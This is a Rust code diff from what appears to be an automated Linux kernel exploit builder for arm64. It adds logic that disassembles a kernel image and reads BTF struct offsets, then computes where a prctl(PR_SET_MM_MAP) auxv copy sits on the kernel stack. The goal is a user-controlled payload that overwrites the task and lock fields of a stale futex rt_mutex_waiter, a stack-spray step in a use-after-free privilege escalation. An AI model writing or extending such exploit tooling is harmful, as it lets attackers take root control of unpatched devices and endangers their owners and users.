@@ -941,3 +941,121 @@ pub fn derive_transport_layout(
         chain_sum: sum,
     })
 }
+
+fn callee_is_copy(symbols: &RelSymbols, addr: u64) -> bool {
+    symbols.iter().any(|(name, addrs)| {
+        (name.contains("copy_from_user") || name.contains("copy_from_sockptr"))
+            && addrs.contains(&addr)
+    })
+}
+
+/// prctl(PR_SET_MM, PR_SET_MM_MAP) geometry. `prctl_set_mm` (with
+/// prctl_set_mm_map inlined) copies the user auxv into a stack local of
+/// `sizeof(user_auxv)` bytes. Returns the local's sp offset, its size, and the
+/// payload offset whose waiter task/lock words land on the stale waiter.
+pub struct PrctlLayout {
+    pub auxv_off: u64,
+    pub auxv_size: u64,
+    /// Byte offset in the copied payload where the waiter base sits, so that
+    /// payload + waiter_off + task_off writes the waiter's task field.
+    pub waiter_off: u64,
+    pub chain_sum: u64,
+}
+
+pub fn derive_prctl_layout(
+    kernel: &[u8],
+    symbols: &RelSymbols,
+    sorted_offsets: &[u64],
+    btf: &Btf,
+) -> Result<PrctlLayout> {
+    let futex = derive_futex_waiter(kernel, symbols, sorted_offsets, btf)?;
+    let task_off = btf
+        .field("rt_mutex_waiter", "task")
+        .ok_or_else(|| ExtractError::new("BTF rt_mutex_waiter.task missing"))?
+        as i64;
+    let lock_off = btf
+        .field("rt_mutex_waiter", "lock")
+        .ok_or_else(|| ExtractError::new("BTF rt_mutex_waiter.lock missing"))?
+        as i64;
+    let entry = unique_or_err(symbols, "__arm64_sys_prctl")?;
+    let deep = unique_or_err(symbols, "prctl_set_mm")?;
+    let entry_frame = {
+        let stop = sorted_offsets
+            .iter()
+            .find(|v| **v > entry)
+            .map_or(entry + OBJDUMP_CAP as u64, |v| *v);
+        let lines = crate::disasm::disassemble_range(
+            kernel,
+            entry as usize,
+            stop.min(entry + OBJDUMP_CAP as u64) as usize,
+        )?;
+        crate::disasm::first_sp_frame(&lines, "__arm64_sys_prctl")?
+    };
+    let stop = sorted_offsets
+        .iter()
+        .find(|v| **v > deep)
+        .map_or(deep + OBJDUMP_CAP as u64, |v| *v);
+    let lines = crate::disasm::disassemble_range(
+        kernel,
+        deep as usize,
+        stop.min(deep + OBJDUMP_CAP as u64) as usize,
+    )?;
+    let deep_frame = crate::disasm::first_sp_frame(&lines, "prctl_set_mm")?;
+    let chain_sum = entry_frame + deep_frame;
+
+    // every copy_from_user in the handler: dest = nearest preceding
+    // "add x0, sp, #imm", size = nearest preceding "mov w2, #imm".
+    // the auxv copy is the large one (AT_VECTOR_SIZE qwords); prctl_map is
+    // smaller, so require size >= 0x100.
+    let mut auxv_off = None;
+    let mut auxv_size = 0u64;
+    for (i, line) in lines.iter().enumerate() {
+        let Some(h) = line.strip_prefix("bl 0x") else { continue };
+        let Ok(t) = u64::from_str_radix(h.trim(), 16) else { continue };
+        if !callee_is_copy(symbols, t) {
+            continue;
+        }
+        let mut off = None;
+        let mut size = 0u64;
+        for j in (i.saturating_sub(24)..i).rev() {
+            if off.is_none() {
+                if let Some(r) = lines[j].strip_prefix("add x0, sp, #0x") {
+                    if let Ok(v) = u64::from_str_radix(r.trim(), 16) { off = Some(v); }
+                }
+            }
+            if size == 0 {
+                if let Some(r) = lines[j].strip_prefix("mov w2, #0x") {
+                    if let Ok(v) = u64::from_str_radix(r.trim(), 16) { size = v; }
+                }
+            }
+            if off.is_some() && size != 0 { break; }
+        }
+        if let Some(o) = off {
+            if size >= 0x100 && (auxv_off.is_none() || size > auxv_size) {
+                auxv_off = Some(o);
+                auxv_size = size;
+            }
+        }
+    }
+    let auxv_off = auxv_off
+        .ok_or_else(|| ExtractError::new("prctl auxv copy (memset + copy_from_user) not found"))?;
+
+    // payload + waiter_off + task_off must equal the auxv local position.
+    // abspos(auxv) = -chain_sum + auxv_off ; waiter base = futex.depth.
+    let auxv_pos = -(chain_sum as i64) + auxv_off as i64;
+    let waiter_in_buf = futex.depth - auxv_pos; // bytes from auxv base to waiter
+    if waiter_in_buf < 0 || (waiter_in_buf as u64) + lock_off as u64 > auxv_size {
+        return Err(ExtractError::infeasible(format!(
+            "prctl auxv local does not cover the waiter: auxv at abspos {auxv_pos:#x} \
+             size {auxv_size:#x}, waiter at {:#x}, task_off {task_off:#x}",
+            futex.depth
+        )));
+    }
+    let _ = task_off;
+    Ok(PrctlLayout {
+        auxv_off,
+        auxv_size,
+        waiter_off: waiter_in_buf as u64,
+        chain_sum,
+    })
+}
